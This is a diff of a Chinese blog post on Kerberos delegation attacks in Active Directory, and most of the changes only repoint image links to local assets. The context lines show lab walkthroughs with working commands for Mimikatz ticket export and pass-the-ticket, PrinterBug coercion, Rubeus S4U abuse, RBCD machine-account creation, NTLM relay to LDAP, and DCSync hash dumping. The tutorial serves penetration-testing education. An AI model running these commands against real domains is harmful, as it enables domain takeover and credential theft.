@@ -14,7 +14,7 @@ layout: post
 
 在下面这个场景中，一个普通域用户 Marcus 通过 Kerberos 协议认证到前台 Web 服务，并请求下载文件。但是由于文件存储在后台文件服务器（File Server）上，因此 Web 服务器的服务账号 WebSvc 将模拟域用户 Marcus，并以 Kerberos 协议继续认证到后台文件服务器。后台文件服务器将文件返回给前台的 Web 服务器，Web 服务器再将文件返回给域用户 Marcus。这就是域委派的一般过程。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/YZ5Qw1cPoqFCNpJ.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/YZ5Qw1cPoqFCNpJ.png)
 
 域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用委派可获取域管理员权限，甚至制作深度隐藏的后门。
 
@@ -24,7 +24,7 @@ layout: post
 
 在非约束性委派（Unconstrained Delegation）中，服务账号可以获取域用户的 TGT，并使用该 TGT 模拟域用户访问任意服务。配置了非约束性委派的账户的 `userAccountControl` 属性会设置 `TRUSTED_FOR_DELEGATION` 标志位。下图所示为非约束性委派的完整请求过程。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/ZGSOItJ8XLEjR19.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/ZGSOItJ8XLEjR19.png)
 ```
 （1）域用户的机器向密钥分发中心（KDC）发送 KRB_AS_REQ 消息，并请求可转发的 TGT 1。
 （2）KDC 在 KRB_AS_REP 消息中返回一个可转发的 TGT 1，该 TGT 1 用于后续访问服务1（Service 1）使用。
@@ -50,11 +50,11 @@ layout: post
 
 首先，在域控制器上为域内主机 WIN10-CLIENT1 配置非约束性委派，如下图所示。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/JgIVyFMCXhYK34o.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/JgIVyFMCXhYK34o.png)
 
 需要注意的是，只有拥有 SeEnableDelegationPrivilege 特权的用户才可以为其他主机账户或服务账户配置非约束性委派，而该特权默认情况下赋予管理员用户，如下图所示。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220331183519791.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331183519791.png)
 
 配置了非约束性委派的账户的 `userAccountControl` 属性会设置 `TRUSTED_FOR_DELEGATION` 标志位，可以在域内主机上通过 AdFind 进行查询，相关命令如下。
 
@@ -65,7 +65,7 @@ C:\Users\Marcus\Desktop> AdFind.exe -b "dc=pentest,dc=com" -f "(&(samAccountType
 C:\Users\Marcus\Desktop> AdFind.exe -b "dc=pentest,dc=com" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/Oi52mAwGhfYTyl3.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/Oi52mAwGhfYTyl3.png)
 
 如上图所示，域内主机 DC01 和 WIN10-CLIENT1 配置了非约束性委派，其中 DC01 为域控制器，WIN10-CLIENT1 为刚才配置的普通域成员主机。假设此时攻击者获取了普通用户 Marcus 的权限，并以 Marcus 用户登录了 WIN10-CLIENT1，那么攻击者可以通过非约束性委派获取域管理员权限。
 
@@ -87,7 +87,7 @@ C:\Users\Marcus\Desktop> AdFind.exe -b "dc=pentest,dc=com" -f "(&(samAccountType
 
 （1）首先，通过 Marcus 用户登录域成员主机 WIN10-CLIENT1，并尝试访问域控制器的 CIFS 服务，结果失败。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220331183734196.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331183734196.png)
 
 （2)接着，当域管理员通过 WinRM 等方式远程连接 WIN10-CLIENT1 主机时，WIN10-CLIENT1 主机的内存中将保存域管理员用户 Administrator 的 TGT。我们可以通过 Mimikatz 导出进行查看，相关命令如下，导出来的票据如下图所示。
 
@@ -95,7 +95,7 @@ C:\Users\Marcus\Desktop> AdFind.exe -b "dc=pentest,dc=com" -f "(&(samAccountType
 C:\Users\Marcus\Desktop> mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220331214823931.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331214823931.png)
 
 （3）如上图所示，可以看到域管理员账户的高权限TGT票据 `[0;13a0f0]-2-0-60a10000-Administrator@krbtgt-PENTEST.COM.kirbi`，执行以下命令，通过 Mimikatz 传递该票据。
 
@@ -103,10 +103,10 @@ C:\Users\Marcus\Desktop> mimikatz.exe "privilege::debug" "sekurlsa::tickets /exp
 C:\Users\Marcus\Desktop> mimikatz.exe "kerberos::ptt [0;13a0f0]-2-0-60a10000-Administrator@krbtgt-PENTEST.COM.kirbi" exit
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/kiJduKsGxT3OVFE.png)
-（4）再次尝试访问 DC01 的 C$ 共享，如下图所示，访问成功。
+![](/assets/posts/2022-03-12-domain-delegation-attack/kiJduKsGxT3OVFE.png)
+（4)再次尝试访问 DC01 的 C$ 共享，如下图所示，访问成功。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220331184355745.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331184355745.png)
 
 ### Coerce Authentication
 
@@ -121,7 +121,7 @@ MS-RPRN协议中定义的 RpcRemoteFindFirstPrinterChangeNotification API 可以
 - https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1
 - https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/0_vqiYvTtZylwXe5zH.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/0_vqiYvTtZylwXe5zH.png)
 下面我将对 PrinterBug 和非约束性委派结合的利用方法进行演示，相关利用工具如下。
 
 （1）首先，通过 Marcus 用户登录域成员主机 WIN10-CLIENT1，尝试通过 DCSync 导出域内用户哈希，结果失败。
@@ -130,7 +130,7 @@ MS-RPRN协议中定义的 RpcRemoteFindFirstPrinterChangeNotification API 可以
 C:\Users\Marcus\Desktop> mimikatz.exe "lsadump::dcsync /domain:pentest.com /user:PENTEST\Administrator" exit
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/ovGxJcZshtCTHVn.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/ovGxJcZshtCTHVn.png)
 
 （2）在 WIN10-CLIENT1 主机上通过本地管理员启动 [Rubeus](https://github.com/GhostPack/Rubeus) 监听，相关命令如下。
 
@@ -141,7 +141,7 @@ C:\Users\Marcus\Desktop> Rubeus.exe monitor /interval:5 /filteruser:DC01$
 # /filteruser 设置监听对象为我们的域控，注意后面有个$，如果不设置监听对象就监听所有的 TGT
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220331184847841.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331184847841.png)
 
 （3）在 WIN10-CLIENT1 主机上执行 SpoolSample，强制域控制器 DC01 向 WIN10-CLIENT1 发起 Kerberos 认证，相关命令如下。值得注意的是，这里必须使用主机名（或者 DNS 名称）而不是 IP 地址。
 
@@ -149,11 +149,11 @@ C:\Users\Marcus\Desktop> Rubeus.exe monitor /interval:5 /filteruser:DC01$
 C:\Users\Marcus\Desktop> SpoolSample.exe DC01 WIN10-CLIENT1
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220331185024374.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331185024374.png)
 
 （4）如下图所示，执行 SpoolSample 后，Rubeus 成功监听并截取到域控机器的 TGT（Base64编码后的）。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/cux2kU4gthjXOiz.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/cux2kU4gthjXOiz.png)
 
 直接使用 Rubeus 传递该 Base64 编码后的票据：
 
@@ -161,18 +161,18 @@ C:\Users\Marcus\Desktop> SpoolSample.exe DC01 WIN10-CLIENT1
 C:\Users\Marcus\Desktop> Rubeus.exe ptt /ticket:<Base64EncodedTicket>
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220331185243424.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331185243424.png)
 
 （5)由于域控机器账户是默认拥有 DCSync 权限的，因此可以成功导出域内用户哈希，如下图所示。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220331185509123.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331185509123.png)
 ## Constrained Delegation
 
 因为非约束委派的不安全性，约束委派（Constrained Delegation）应运而生。在 Widnows Server 2003 之后微软引入了非约束委派。同时，为了顺利进行约束性委派，微软为 Kerberos 协议的 TGS_REQ 和 TGS_REP 阶段引入了两个扩展协议 S4u2self（Service for User to Self）和 S4U2proxy（Service for User to Proxy）。
 
 S4U2self 扩展允许服务代表用户获取针对自己的服务票据，S4U2proxy 允许服务代表用户获取另一个服务的服务票据。约束委派就是限制了 S4U2proxy 扩展的请求范围，使得配置了委派属性的服务只能模拟用户身份访问特定的其他服务。配置了约束性委派的账户的 `userAccountControl` 属性会设置 `TRUSTED_TO_AUTH_FOR_DELEGATION` 标志位，并且账户的 `msDS-AllowedToDelegateTo` 属性会被设置为对哪些服务进行委派。下图所示为约束性委派中，S4U2self 和 S4U2proxy 扩展的完整请求过程。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/q1dGC3syUAfR29w.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/q1dGC3syUAfR29w.png)
 ```
 （1）域用户的机器向 Service 1 发出请求。用户通过了身份验证，但 Service 1 中没有用户的所需要的授权数据。该过程通常是由 Kerberos 认证以外的其他认证方式执行的。
 （2）假设 Service 1 已通过 KDC 进行身份验证并获得其 TGT，此时其可以通过 S4U2self 扩展代表指定用户向 KDC 请求针对自身服务的票据。
@@ -194,7 +194,7 @@ S4U2self 扩展允许服务代表用户获取针对自己的服务票据，S4U2p
 
 首先，在域控制器上为域内主机 WIN10-CLIENT1 配置约束性委派，配置其对域控制器 DC01 的 LDAP 服务进行委派，如下图所示。需要注意的是，只有拥有 SeEnableDelegationPrivilege 特权的用户才可以为其他主机账户或服务账户配置非约束性委派，而该特权默认情况下赋予管理员用户。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/56Pmh8fnabJdRsA.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/56Pmh8fnabJdRsA.png)
 
 配置了约束性委派的账户的 `userAccountControl` 属性会设置 `TRUSTED_TO_AUTH_FOR_DELEGATION` 标志位，并且账户的 `msDS-AllowedToDelegateTo` 属性会被设置为对哪些服务进行委派。可以在域内主机上通过 AdFind 进行查询，相关命令如下。
 
@@ -205,7 +205,7 @@ C:\Users\Marcus\Desktop> AdFind.exe -b "dc=pentest,dc=com" -f "(&(samAccountType
 C:\Users\Marcus\Desktop> AdFind.exe -b "dc=pentest,dc=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/Xw2Qlq94bOYByKA.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/Xw2Qlq94bOYByKA.png)
 
 从查询结果中可以看到，此时域成员主机 WIN10-CLIENT1 配置了约束性委派，并对域控制器 DC01 的 LDAP 服务进行委派。假设此时攻击者获取了普通用户 Marcus 的权限，并以 Marcus 用户登录了 WIN10-CLIENT1，那么攻击者可以通过约束性委派获取域控制器权限。
 
@@ -238,7 +238,7 @@ C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:WIN10-CLIENT1$ /rc4:5dd934ddeff
 # /dc 指定域控制器
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220331220531127.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331220531127.png)
 
 （3)然后执行以下命令，使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中，执行结果如下图所示。
 
@@ -247,13 +247,13 @@ C:\Users\Marcus\Desktop> Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:
 # Rubeus.exe s4u /impersonateuser:PENTEST\Administrator /altservice:LDAP/DC01.pentest.com /dc:DC01.pentest.com /ptt /ticket:<Base64EncodedTicket>
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/fBrHLyAg4WKncMx.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/fBrHLyAg4WKncMx.png)
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220331220707910.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331220707910.png)
 
 （4）再次尝试 DCSync 操作，此时可以成功导出域内用户哈希，如下图所示。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220331190001021.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331190001021.png)
 ## Resource-Based Constrained Delegation
 
 基于资源的约束委派（Resource-Based Constrained Delegation，RBCD）是在 Windows Server 2012 中新引入的功能，与传统的约束委派相比，它不再需要拥有 SeEnableDelegationPrivilege 特权的域管理员去设置相关属性，并且将设置委派的权限交换给了服务资源自身，即服务自己可以决定谁可以对我进行委派。
@@ -289,7 +289,7 @@ Get-DomainUser -Identity Marcus -Properties objectsid
 Get-DomainObjectAcl -Identity DC01 | ?{$_.SecurityIdentifier -match "S-1-5-21-1536491439-3234161155-253608391-1106"}
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/ixNPClrDA6EM7tB.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/ixNPClrDA6EM7tB.png)
 
 （2）Marcus 用户对 DC01 完全控制，因此可以通过 Marcus 用户的权限修改并设置机器账户 DC01 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。但此时还需要一个具有 SPN 的账户，以允许该账户对 DC01 上的服务进行委派。在域内，如果拥有一个普通的域用户，那么我们就可以利用这个用户创建新的机器帐户，并且默认最多允许创建 10 个机器账户，这是由域属性 `MachineAccountQuota` 决定的。
 
@@ -304,7 +304,7 @@ $Password = ConvertTo-SecureString 'Passw0rd' -AsPlainText -Force
 New-MachineAccount -MachineAccount "PENTEST" -Password $($Password) -Domain "pentest.com" -DomainController "DC01.pentest.com" -Verbose
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/RCsrS6cwDjqmEvz.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/RCsrS6cwDjqmEvz.png)
 
 （3）接下来，我们通过 PowerView.ps1 配置 PENTEST 到 DC01 的基于资源的约束性委派，相关命令如下。
 
@@ -322,7 +322,7 @@ Get-DomainComputer DC01 | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOt
 Get-DomainComputer DC01 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/RnwZXNUph4t8O67.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/RnwZXNUph4t8O67.png)
 
 若想清除 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值，可以执行以下命令：
 
@@ -341,7 +341,7 @@ C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:PENTEST$ /password:Passw0rd /do
 # /dc 指定域控制器
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220331220856516.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331220856516.png)
 
 （3)然后执行以下命令，使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中，执行结果如下图所示。
 
@@ -349,12 +349,12 @@ C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:PENTEST$ /password:Passw0rd /do
 C:\Users\Marcus\Desktop> Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC01.pentest.com /dc:DC01.pentest.com /ptt /ticket:<Base64EncodedTicket>
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/UQ7epNm1h8nzDVE.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/UQ7epNm1h8nzDVE.png)
 ![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/iMS6EJnGm3HZAew.png)
 
 （4）此时执行 DCSync，可以成功导出域内用户哈希，如下图所示。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220331190944631.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331190944631.png)
 ### NTLM Relay + RBCD
 
 前面我们介绍了基于资源的约束性委派的一般利用过程，一个很关键的条件就是当前所控的用户必须对 Service 2 拥有 GenericAll、GenericWrite、WriteProperty 或 WriteDacl 等权限，否则将无法修改并设置其 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性。然而，在 NTLM Relay 中，通过 Relay To LDAP 可以直接修改活动目录中的属性值，如果我们控制一个机器账户通过 NTLM Relay 认证到 LDAP，毫无疑问该机器账户能够直接修改并设置自己的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性。
@@ -382,7 +382,7 @@ python3 addcomputer.py pentest.com/Marcus:Marcus\@123 -computer-name PENTEST\$ -
 # -computer-pass 指定要创建的机器账户密码
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/jPNMZJx4pKHzU7f.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/jPNMZJx4pKHzU7f.png)
 
 （2)执行以下命令，在 Kali Linux 上启动 ntlmrelayx.py 监听，如图下所示。
 
@@ -390,7 +390,7 @@ python3 addcomputer.py pentest.com/Marcus:Marcus\@123 -computer-name PENTEST\$ -
 python3 ntlmrelayx.py -t ldap://172.26.10.11 --remove-mic --delegate-access --escalate-user PENTEST\$ -smb2support
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220331191056561.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331191056561.png)
 
 （3）然后通过 Python 版本的 [Printerbug](https://github.com/dirkjanm/krbrelayx) 迫使 WIN2016-WEB1 主机向 Kali Linux 发起 NTLM 认证请求，相关命令如下。
 
@@ -398,11 +398,11 @@ python3 ntlmrelayx.py -t ldap://172.26.10.11 --remove-mic --delegate-access --es
 python3 printerbug.py pentest.com/Marcus:Marcus\@123@172.26.10.13 172.26.10.134
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/rSHPsu8IinDGMNc.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/rSHPsu8IinDGMNc.png)
 
 此时，ntlmrelayx.py 将截获 WIN2016-WEB1 机器账户的 Net-NTLM Hash，并将其 Relay 到域控的 LDAP 服务，如图下所示。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/r8G7sHd61cSCQWT.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/r8G7sHd61cSCQWT.png)
 
 （4）接着，通过 Impacket 套件中的 getST.py 执行基于资源的约束性委派攻击，并获取用于访问 WIN2016-WEB1 机器上 CIFS 服务的高权限票据，如图下所示。
 
@@ -414,7 +414,7 @@ python3 getST.py pentest.com/PENTEST\$:Passw0rd -spn CIFS/WIN2016-WEB1.pentest.c
 # -dc-ip 指定域控制器的 IP 地址  
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/OULbGYMhfg1eiVy.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/OULbGYMhfg1eiVy.png)
 
 （5）最后，通过设置环境变量 `KRB5CCNAME` 来使用该票据，并通过 smbexec.py 获取 WIN2016-WEB1 机器的最高权限，相关命令如下，执行结果如下图所示。在执行以下命令之前，需要将 Kali Linux 的 /etc/resolv.conf 中 DNS 服务器改为域控制器的 IP 地址。
 
@@ -426,7 +426,7 @@ python3 smbexec.py -target-ip 172.26.10.13 -k WIN2016-WEB1.pentest.com -no-pass
 # -no-pass 指定不需要提供密码，与 -k 选项配合使用
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/5X3UGQMcLBgNsHY.png)
+![](/assets/posts/2022-03-12-domain-delegation-attack/5X3UGQMcLBgNsHY.png)
 ## Ending......
 
 参考文献：
